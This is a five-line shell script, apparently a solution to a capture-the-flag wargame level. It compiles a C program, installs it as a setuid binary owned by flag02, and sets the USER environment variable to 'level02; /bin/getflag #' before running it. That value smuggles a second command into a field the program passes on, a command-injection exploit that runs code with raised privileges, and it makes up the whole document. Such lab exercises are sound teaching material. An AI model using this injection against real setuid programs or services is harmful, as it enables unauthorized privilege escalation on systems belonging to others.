gcc -o flag02-strpbrk level2-strpbrk.c
chown flag02:level02 ./flag02-strpbrk
chmod 4750 ./flag02-strpbrk
USER='level02; /bin/getflag #'
./flag02-strpbrk